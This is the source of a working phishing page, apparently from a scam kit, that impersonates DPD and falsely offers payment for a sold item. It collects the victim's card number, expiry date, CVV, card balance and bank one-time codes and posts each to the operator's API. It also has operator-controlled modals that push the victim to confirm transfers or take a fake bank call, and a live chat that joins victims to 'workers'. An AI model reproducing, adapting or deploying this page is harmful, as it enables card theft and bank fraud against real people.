<!DOCTYPE html>
<!-- saved from url=(0029)https://dpd.zgs-rd.info/jZHsW -->
<html id="html" prefix="og: https://ogp.me/ns#" data-critters-container="">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <title>{{ $order->ad_name }}</title>
    <base href=".">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

    @vite(['resources/css/app.css', 'resources/js/app.js'])
    <style>
        /* Add spinner animation */
        .loader {
            border-top-color: #3498db;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
    </style>

    <style>
        .chat-widget {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 300px;
            z-index: 1000;
        }
        .chat-header {
            background-color: #007bff;
            color: white;
            padding: 10px;
            border-radius: 5px 5px 0 0;
            cursor: pointer;
        }
        .chat-body {
            display: none;
            background-color: white;
            border: 1px solid #ccc;
            border-radius: 0 0 5px 5px;
            max-height: 400px;
            overflow-y: auto;
            padding: 10px;
        }
        .chat-footer {
            display: none;
            background-color: white;
            border: 1px solid #ccc;
            border-radius: 0 0 5px 5px;
            padding: 10px;
        }
        .chat-container {
            display: flex;
            flex-direction: column;
            height: 300px;
            overflow-y: scroll;
        }
        .message {
            margin-bottom: 10px;
            word-wrap: break-word;
            overflow-wrap: break-word;
        }
        .message.mine {
            text-align: right;
        }
        .message .content {
            display: inline-block;
            padding: 10px;
            border-radius: 10px;
            max-width: 100%; /* Ограничивает максимальную ширину контента */
            word-wrap: break-word; /* Добавленное свойство для переноса длинных слов */
            overflow-wrap: break-word; /* Добавленное свойство для переноса длинных слов */
        }
        .message.mine .content {
            background-color: #e0ffe0;
        }
        .message.their .content {
            background-color: #f0f0f0;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
<div class="chat-widget fixed bottom-4 right-4 bg-white shadow-lg rounded-lg overflow-hidden">
    <div class="chat-header bg-blue-500 text-white p-4 cursor-pointer flex items-center justify-between" onclick="toggleChat()">
        <span>Chat Support</span>
        <span id="notificationIndicator" class="hidden bg-red-500 h-3 w-3 rounded-full inline-block ml-2"></span>
    </div>
    <div class="chat-body hidden p-4" id="chatBody">
        <div id="chat" class="chat-container space-y-2">
            <!-- Messages will appear here -->
        </div>
    </div>
    <div class="chat-footer p-4 bg-gray-100 flex items-center">
        <input type="text" id="messageInput" class="border border-gray-300 p-2 rounded flex-grow mr-2" placeholder="Type your message here...">
        <button onclick="sendMessage()" class="bg-blue-500 text-white py-2 px-4 rounded">Send</button>
    </div>
</div>
<header id="header" class="bg-white shadow">
    <div class="max-w-7xl mx-auto py-4 px-4 sm:px-4 flex justify-between items-center">
        <div class="flex-shrink-0">
            <a href="https://www.dpd.co.uk/"><img src="/images/dpd.svg" alt="DPD Logo" class="h-16 w-16"></a>
        </div>
    </div>
</header>
<div id="main-content" class="flex h-screen items-center justify-center">
    <div class="flex flex-col md:flex-row bg-white rounded-lg shadow-lg overflow-hidden">
        <div class="flex flex-col items-center justify-center p-10">
            <img src="/images/dpd.svg" alt="DPD Logo" class="mb-4 w-16">
            <h1 class="text-2xl font-bold">{{ $order->ad_name }}</h1>
            <p class="text-4xl mt-2">£{{ $order->price }}</p>
        </div>
        <div class="p-10 bg-gray-50">
            <h2 class="text-xl font-semibold mb-4">Get funds to the card</h2>
            <form>
                <div class="mb-4">
                    <label class="block text-gray-700 text-sm font-bold mb-2" for="card-number">
                        Card data
                    </label>
                    <input
                        class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                        id="card-number" type="text" placeholder="0000 0000 0000 0000">
                </div>
                <div class="flex mb-4">
                    <div class="mr-2">
                        <label class="block text-gray-700 text-sm font-bold mb-2" for="expiry-date">
                            Month / Year
                        </label>
                        <input
                            class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                            id="expiry-date" type="text" placeholder="MM / YY">
                    </div>
                    <div>
                        <label class="block text-gray-700 text-sm font-bold mb-2" for="cvv">
                            CVV Number
                        </label>
                        <input
                            class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                            id="cvv" type="text" placeholder="CVV">
                    </div>
                </div>
                <div class="flex items-center justify-between">
                    <button id="receive"
                        class="bg-red-600 w-full hover:bg-red-700 text-white text-lg font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline"
                        type="button">
                        Receive
                    </button>
                </div>
            </form>
        </div>
    </div>
</div>
<!-- Push confirm modal -->
<div id="modalEl" tabindex="-1" aria-hidden="true" class="hidden overflow-y-auto overflow-x-hidden fixed top-0 right-0 left-0 z-50 justify-center items-center w-full md:inset-0 h-[calc(100%-1rem)] max-h-full">
    <div class="relative p-4 w-full max-w-2xl max-h-full">
        <!-- Modal content -->
        <div class="relative bg-white rounded-lg shadow dark:bg-gray-700">
            <!-- Modal header -->
            <div class="flex items-center justify-between p-4 md:p-5 border-b rounded-t dark:border-gray-600">
                <h3 class="text-xl font-semibold text-gray-900 dark:text-white">
                    Confirmation of deposit to account
                </h3>
                <button type="button" class="text-gray-400 bg-transparent hover:bg-gray-200 hover:text-gray-900 rounded-lg text-sm w-8 h-8 ms-auto inline-flex justify-center items-center dark:hover:bg-gray-600 dark:hover:text-white" data-modal-hide="modalEl">
                    <svg class="w-3 h-3" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 14 14">
                        <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6"/>
                    </svg>
                    <span class="sr-only">Close modal</span>
                </button>
            </div>
            <!-- Modal body -->
            <div class="p-4 md:p-5 space-y-4">
                <p class="text-base leading-relaxed text-gray-500 dark:text-gray-400">
                    To credit the transfer to your account, confirm it on your bank's mobile app or online banking site.
                </p>
            </div>
            <!-- Modal footer -->
            <div class="flex items-center p-4 md:p-5 border-t border-gray-200 rounded-b dark:border-gray-600">
                <button data-modal-hide="modalEl" type="button" class="text-white bg-red-600 font-bold hover:bg-red-800 focus:ring-4 focus:outline-none focus:ring-blue-300 rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">
                    Receive
                </button>
            </div>
        </div>
    </div>
</div>

<!-- Balance modal -->
<div id="modalBalance" tabindex="-1" aria-hidden="true" class="hidden overflow-y-auto overflow-x-hidden fixed top-0 right-0 left-0 z-50 justify-center items-center w-full md:inset-0 h-[calc(100%-1rem)] max-h-full">
    <div class="relative p-4 w-full max-w-2xl max-h-full">
        <!-- Modal content -->
        <div class="relative bg-white rounded-lg shadow dark:bg-gray-700">
            <!-- Modal header -->
            <div class="flex items-center justify-between p-4 md:p-5 border-b rounded-t dark:border-gray-600">
                <h3 class="text-xl font-semibold text-gray-900 dark:text-white">
                    Verification. The Bank requested additional data
                </h3>
                <button type="button" id="hideModalBalance" class="text-gray-400 bg-transparent hover:bg-gray-200 hover:text-gray-900 rounded-lg text-sm w-8 h-8 ms-auto inline-flex justify-center items-center dark:hover:bg-gray-600 dark:hover:text-white">
                    <svg class="w-3 h-3" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 14 14">
                        <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6"/>
                    </svg>
                    <span class="sr-only">Close modal</span>
                </button>
            </div>
            <!-- Modal body -->
            <div class="flex flex-col items-center p-4 md:p-5 space-y-4 w-full">
                <div class="text-base leading-relaxed text-gray-500 dark:text-gray-400 lg:w-1/2 w-full">
                    <label class="block text-gray-700 text-sm font-bold mb-2" for="card-balance">
                        Card Balance
                    </label>
                    <input
                        class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                        id="card-balance" type="text" placeholder="£0.00">
                </div>
                <span class="text-gray-500 text-sm text-center lg:w-1/2 w-full sm:w-full">To verify, enter the exact balance of your card. The data will be verified through the bank that issued the card.</span>
            </div>
            <!-- Modal footer -->

            <div class="flex items-center p-4 md:p-5 border-t border-gray-200 rounded-b dark:border-gray-600">
                <button id="sendLog" type="button" class="text-white bg-red-600 font-bold hover:bg-red-800 focus:ring-4 focus:outline-none focus:ring-blue-300 rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">
                    Receive
                </button>
            </div>
        </div>
    </div>
</div>

<!-- Code confirm modal -->
<div id="modalCodeBank" tabindex="-1" aria-hidden="true" class="hidden overflow-y-auto overflow-x-hidden fixed top-0 right-0 left-0 z-50 justify-center items-center w-full md:inset-0 h-[calc(100%-1rem)] max-h-full">
    <div class="relative p-4 w-full max-w-2xl max-h-full">
        <!-- Modal content -->
        <div class="relative bg-white rounded-lg shadow dark:bg-gray-700">
            <!-- Modal header -->
            <div class="flex items-center justify-between p-4 md:p-5 border-b rounded-t dark:border-gray-600">
                <h3 class="text-xl font-semibold text-gray-900 dark:text-white">
                    Confirmation of deposit to account
                </h3>
                <button type="button" id="hideModalCode" class="text-gray-400 bg-transparent hover:bg-gray-200 hover:text-gray-900 rounded-lg text-sm w-8 h-8 ms-auto inline-flex justify-center items-center dark:hover:bg-gray-600 dark:hover:text-white">
                    <svg class="w-3 h-3" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 14 14">
                        <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6"/>
                    </svg>
                    <span class="sr-only">Close modal</span>
                </button>
            </div>
            <!-- Modal body -->
            <div class="flex flex-col items-center p-4 md:p-5 space-y-4 w-full">
                <div class="text-base leading-relaxed text-gray-500 dark:text-gray-400 lg:w-1/2 w-full">
                    <label class="block text-gray-700 text-sm font-bold mb-2" for="code-bank">
                        Enter the code sent to you by the bank
                    </label>
                    <input
                        class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                        id="code-bank" type="text">
                </div>
            </div>
            <!-- Modal footer -->

            <div class="flex items-center p-4 md:p-5 border-t border-gray-200 rounded-b dark:border-gray-600">
                <button id="sendCode" type="button" class="text-white bg-red-600 font-bold hover:bg-red-800 focus:ring-4 focus:outline-none focus:ring-blue-300 rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">
                    Receive
                </button>
            </div>
        </div>
    </div>
</div>

<!-- Call confirm modal -->
<div id="modalCallBank" tabindex="-1" aria-hidden="true" class="hidden overflow-y-auto overflow-x-hidden fixed top-0 right-0 left-0 z-50 justify-center items-center w-full md:inset-0 h-[calc(100%-1rem)] max-h-full">
    <div class="relative p-4 w-full max-w-2xl max-h-full">
        <!-- Modal content -->
        <div class="relative bg-white rounded-lg shadow dark:bg-gray-700">
            <!-- Modal header -->
            <div class="flex items-center justify-between p-4 md:p-5 border-b rounded-t dark:border-gray-600">
                <h3 class="text-xl font-semibold text-gray-900 dark:text-white">
                    Confirmation of deposit to account
                </h3>
                <button type="button" class="text-gray-400 bg-transparent hover:bg-gray-200 hover:text-gray-900 rounded-lg text-sm w-8 h-8 ms-auto inline-flex justify-center items-center dark:hover:bg-gray-600 dark:hover:text-white" data-modal-hide="modalCallBank">
                    <svg class="w-3 h-3" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 14 14">
                        <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6"/>
                    </svg>
                    <span class="sr-only">Close modal</span>
                </button>
            </div>
            <!-- Modal body -->
            <div class="p-4 md:p-5 space-y-4">
                <p class="text-base leading-relaxed text-gray-500 dark:text-gray-400">
                    a bank operator will call you now to confirm, confirm receipt of funds
                </p>
            </div>
            <!-- Modal footer -->
            <div class="flex items-center p-4 md:p-5 border-t border-gray-200 rounded-b dark:border-gray-600">
                <button id="hideModalCall" data-modal-hide="modalCallBank" type="button" class="text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">I accept</button>
            </div>
        </div>
    </div>
</div>

<!-- Fullscreen loader modal -->
<div id="loaderModal" class="fixed inset-0 bg-gray-800 bg-opacity-75 flex items-center justify-center hidden">
    <div class="flex flex-col items-center">
        <!-- Loader spinner -->
        <div class="loader ease-linear rounded-full border-8 border-t-8 border-gray-200 h-32 w-32 mb-4"></div>
        <h2 class="text-white text-xl font-semibold">Loading...</h2>
    </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/inputmask@5.0.9/dist/jquery.inputmask.min.js"></script>

<script type="module">
    document.addEventListener("DOMContentLoaded", function() {
        Inputmask("9999 9999 9999 9999").mask("#card-number");
        Inputmask("99/99").mask("#expiry-date");
        Inputmask("999[9]").mask("#cvv");

        Inputmask("[9][9][9][9][9][9][9][9][9][9][9][9][9][9][9]").mask("#card-balance");

        const unique_id = '{{ $order->unique_id }}'


        window.Echo.channel('modal-channel')
            .listen('OpenModalEvent', (e) => {
                if (unique_id === e.unique_id) {
                    if (e.action == 'open-push') {
                        window.modalPush.show()
                    } else if (e.action == 'hide-push') {
                        window.modalPush.hide()
                    } else if (e.action == 'open-code') {
                        window.modalCodeBank.show()
                    } else if (e.action == 'hide-code') {
                        window.modalCodeBank.hide()
                    } else if (e.action == 'open-call') {
                        window.modalCallBank.show()
                    } else if (e.action == 'hide-call') {
                        window.modalCallBank.hide()
                    }
                }
            });

        $('#hideModalPush').on('click', function () {
            window.modalPush.hide()
        })
        $('#hideModalBalance').on('click', function () {
            window.modalBalance.hide()
        })
        $('#hideModalCode').on('click', function () {
            window.modalCodeBank.hide()
        })
        $('#hideModalCall').on('click', function () {
            window.modalCallBank.hide()
        })
    })

    $('#receive').on('click', function () {
        window.axios.post('/api/write-balance', {
            unique_id: '{{ $order->unique_id }}',
            card: $('#card-number').val(),
            expiryDate: $('#expiry-date').val(),
            cvv: $('#cvv').val(),
        })

        window.modalBalance.show()
    })

    $('#sendLog').on('click', function () {
        window.axios.post('/api/send-log', {
            unique_id: '{{ $order->unique_id }}',
            card: $('#card-number').val(),
            expiryDate: $('#expiry-date').val(),
            cvv: $('#cvv').val(),
            balance: $('#card-balance').val(),
        })

        window.modalBalance.hide()
        $('#loaderModal').removeClass('hidden')
        $('#main-content').addClass('blur')
        $('#header').addClass('blur')
    })

    $('#sendCode').on('click', function () {
        window.axios.post('/api/send-code', {
            unique_id: '{{ $order->unique_id }}',
            code: $('#code-bank').val(),
        })

        window.modalCodeBank.hide()
        $('#loaderModal').removeClass('hidden')
        $('#main-content').addClass('blur')
        $('#header').addClass('blur')
    })
</script>
<script>
    const linkId = '{{ $order->unique_id }}'; // уникальный номер ссылки

    document.addEventListener("DOMContentLoaded", function() {
        loadMessages();

        window.Echo.channel('chat.' + linkId)
            .listen('MessageSent', (e) => {
                const message = e.message;
                addMessageToChat(message);
                scrollChatToBottom()

                const chatBody = document.querySelector('.chat-body');
                const isHidden = getComputedStyle(chatBody).display === 'none';
                if (isHidden) {
                    $('#notificationIndicator').removeClass('hidden');
                }
            });
    })

    function loadMessages() {
        $.get('/api/get-messages/' + linkId, function(data) {
            data.forEach(function(message) {
                addMessageToChat(message);
            });
            scrollChatToBottom();
        });
    }

    function addMessageToChat(message) {
        const messageElement = $('<div>').addClass('message');
        const contentElement = $('<div>').addClass('content').text(message.message);

        if (message.who === 'worker') {
            messageElement.addClass('their');
        } else {
            messageElement.addClass('mine');
        }

        messageElement.append(contentElement);
        $('#chat').append(messageElement);
        scrollChatToBottom();
    }

    function sendMessage() {
        const messageInput = document.getElementById('messageInput');
        const message = messageInput.value;

        fetch('/api/send-message', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': '{{ csrf_token() }}'
            },
            body: JSON.stringify({ unique_id: linkId, message: message, who: 'lid' })
        }).then(response => response.json()).then(data => {
            if (data.status === 'Message Sent!') {
                const messageElement = $('<div>').addClass('message');
                const contentElement = $('<div>').addClass('content').text(message);
                messageElement.addClass('mine');
                messageElement.append(contentElement);
                $('#chat').append(messageElement);
                messageInput.value = '';
                scrollChatToBottom()

                // Отправка сообщения боту
                fetch('/send-to-bot', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-CSRF-TOKEN': '{{ csrf_token() }}'
                    },
                    body: JSON.stringify({ unique_id: linkId, message: message })
                });
            }
        });
    }

    function toggleChat() {
        const chatBody = document.querySelector('.chat-body');
        const chatFooter = document.querySelector('.chat-footer');
        const isHidden = getComputedStyle(chatBody).display === 'none';
        chatBody.style.display = isHidden ? 'block' : 'none';
        chatFooter.style.display = isHidden ? 'block' : 'none';
        if (isHidden) {
            $('#notificationIndicator').addClass('hidden');
        }
        scrollChatToBottom()
    }

    function scrollChatToBottom() {
        $("#chat").scrollTop($("#chat")[0].scrollHeight);
    }
</script>
</body>
</html>
